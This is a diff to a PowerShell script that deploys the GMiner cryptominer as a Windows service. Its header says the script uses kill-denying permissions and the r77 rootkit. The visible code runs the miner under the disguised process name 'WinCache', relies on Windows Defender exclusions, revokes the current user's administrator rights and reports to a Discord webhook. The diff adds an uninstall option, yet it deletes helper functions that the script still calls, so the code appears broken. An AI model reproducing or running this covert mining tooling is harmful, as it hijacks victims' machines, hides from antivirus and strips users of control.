@@ -3,9 +3,10 @@
 .SYNOPSIS
     Deploys and runs GMiner as a Windows Service using NSSM.
     Includes DACL protection (Access Denied on kill), r77 Rootkit, and Safe Update.
-    NOTE: This version DOES NOT include the -Uninstall switch.
 .EXAMPLE
     .\Mine.ps1 -Wallet "YOUR_WALLET_ADDRESS" -Pool "us-rvn.2miners.com:6060" -Algo "kawpow" -DiscordWebhook "https://discord.com/api/webhooks/..."
+.EXAMPLE
+    .\Mine.ps1 -Uninstall
 #>
 [CmdletBinding()]
 param(
@@ -14,6 +15,7 @@ param(
     [string]$Algo,
     [string]$Worker,
     [string]$DiscordWebhook,
+    [switch]$Uninstall,
     [switch]$Foreground,
     [switch]$TestWebhook,
     [switch]$Diagnose,
@@ -152,73 +154,40 @@ if (-not $Run -and -not $NoElevate) {
 # ---------- secure admin revocation + utilman.exe integrity check & repair -----
 # Compatible: Windows 10 (1607+) / Windows 11 · Requiere PowerShell como Admin
 
-$AdminGroupSID = New-Object System.Security.Principal.SecurityIdentifier('S-1-5-32-544')
-try {
-    $AdminGroupName = $AdminGroupSID.Translate([System.Security.Principal.NTAccount]).Value
-} catch {
-    Write-Host '[-] No se pudo resolver el nombre del grupo Administradores.'
+# --- Guardrails ---
+if (-not (Test-IsElevated)) {
+    Write-Host '[-] Ejecute PowerShell como Administrador.'
     exit 1
 }
 
-function Test-IsElevated {
-    $id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
-    (New-Object System.Security.Principal.WindowsPrincipal($id)
-        ).IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
-}
-
-function Get-AdminMembers {
-    try   { return @(Get-LocalGroupMember -Group $AdminGroupName -ErrorAction Stop) }
-    catch {
-        # Fallback por SID si el nombre traducido falla
-        return @(Get-LocalGroupMember -SID 'S-1-5-32-544' -ErrorAction SilentlyContinue)
-    }
-}
-
+# --- Comprobar admins habilitados (no solo existentes) ---
 function Test-BackupAdmin {
-    Write-Host "[*] Comprobando cuentas de administrador en '$AdminGroupName'..."
     $members = Get-AdminMembers
-
     if (-not $members -or $members.Count -eq 0) {
-        Write-Host '[-] Ninguna cuenta de administrador encontrada. No se revocan permisos.'
+        Write-Host '[-] No hay administradores. Abortando.'
         return $false
     }
-
-    foreach ($m in $members) {
-        Write-Host "    - $($m.Name) [$($m.ObjectClass)]"
-    }
-
-    if ($members.Count -le 1) {
-        Write-Host '[-] Solo existe 1 cuenta de administrador. No se revocan permisos (evita bloquear el sistema).'
+    $enabled = @($members | Where-Object {
+        # Excluir la cuenta actual
+        $_.Name -ne ([System.Security.Principal.WindowsIdentity]::GetCurrent()).Name -and
+        # Excluir deshabilitados
+        (Get-LocalUser -Name ($_.Name.Split('\')[-1]) -ErrorAction SilentlyContinue).Enabled -eq $true
+    })
+    if ($enabled.Count -lt 1) {
+        Write-Host '[-] No queda ningún administrador habilitado tras la revocación. Abortando.'
         return $false
     }
-
-    Write-Host "[+] $($members.Count) cuentas de administrador presentes. Seguro para proceder."
     return $true
 }
 
-function Remove-CurrentUserAdmin {
+# --- Main ---
+if (Test-BackupAdmin) {
+    Remove-CurrentUserAdmin
+    # Verificación real por SID, no por -like:
     $me = [System.Security.Principal.WindowsIdentity]::GetCurrent()
-
-    $isAdmin = $me.Groups | Where-Object { $_.Value -eq $AdminGroupSID.Value }
-    if (-not $isAdmin) {
-        Write-Host "[+] El usuario actual ($($me.Name)) ya no es administrador."
-        return
-    }
-
-    Write-Host "[*] Revocando privilegios de Administrador a '$($me.Name)'..."
-    try {
-        Remove-LocalGroupMember -Group $AdminGroupName -Member $me.Name -ErrorAction Stop
-        Write-Host '[+] Privilegios revocados. Cierre sesión para que surta efecto.'
-    } catch {
-        Write-Host "[-] Falló la revocación vía cmdlet: $_"
-        # Fallback CLI clásico (funciona con cuentas Microsoft/Entra en algunos casos)
-        net localgroup $AdminGroupName "$($me.Name)" /delete 2>$null | Out-Null
-        if (-not ((Get-AdminMembers | Where-Object { $_.Name -like "*$($me.Name.Split('\')[-1])*" }))) {
-            Write-Host '[+] Privilegios revocados vía fallback CLI.'
-        } else {
-            Write-Host '[-] No se pudo revocar el acceso de administrador.'
-        }
-    }
+    $stillAdmin = (Get-AdminMembers | Where-Object { $_.SID.Value -eq $me.User.Value }).Count -gt 0
+    if ($stillAdmin) { Write-Host '[-] No se pudo revocar.'; exit 1 }
+    Write-Host '[+] Revocado. Cierre sesión.'
 }
 
 # ---------- utilman.exe integrity check & repair ----------------------------
@@ -289,12 +258,49 @@ function Repair-Utilman {
     }
 }
 
+if (-not $Uninstall) {
+    if (-not (Test-Utilman)) {
+        Write-Host '[-] utilman.exe ausente, alterado o idéntico a cmd.exe. Iniciando reparación...'
+        Repair-Utilman
+    } else {
+        Write-Host '[+] utilman.exe íntegro.'
+    }
+}
 
-if (-not (Test-Utilman)) {
-    Write-Host '[-] utilman.exe ausente, alterado o idéntico a cmd.exe. Iniciando reparación...'
-    Repair-Utilman
-} else {
-    Write-Host '[+] utilman.exe íntegro.'
+
+# ---------- uninstall / stop safe -------------------------------------------
+function Stop-Safe {
+    Write-Host '[*] Deteniendo servicio y procesos de forma segura...'
+    
+    # Intentar detener el servicio con NSSM si existe
+    if (Test-Path $NssmPath) {
+        & $NssmPath stop $TaskName 2>$null | Out-Null
+    }
+    
+    # Si quedó algún proceso de PowerShell atascado, matarlo
+    $watchers = Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -ErrorAction SilentlyContinue |
+        Where-Object { $_.CommandLine -like '*WinCache.ps1*' }
+    foreach ($w in $watchers) {
+        Stop-Process -Id $w.ProcessId -Force -ErrorAction SilentlyContinue
+    }
+    
+    Start-Sleep -Seconds 1
+    Get-Process WinCache -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+}
+
+if ($Uninstall) {
+    Stop-Safe
+    # Eliminar servicio
+    if (Test-Path $NssmPath) { & $NssmPath remove $TaskName confirm 2>$null | Out-Null }
+    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
+    
+    try {
+        Remove-MpPreference -ExclusionPath $Root -ErrorAction SilentlyContinue
+        Remove-MpPreference -ExclusionProcess 'WinCache.exe' -ErrorAction SilentlyContinue
+    } catch {}
+    
+    Write-Host '[+] Desinstalado correctamente.'
+    return
 }
 
 # ---------- watcher mode ----------------------------------------------------
@@ -475,4 +481,7 @@ Write-Host "  Log     : $LogFile"
 Write-Host ''
 Write-Host '  Diagnose:'
 Write-Host '    .\Mine.ps1 -Diagnose'
+Write-Host ''
+Write-Host '  Stop everything:'
+Write-Host '    .\Mine.ps1 -Uninstall'
 Write-Host '=================================================='
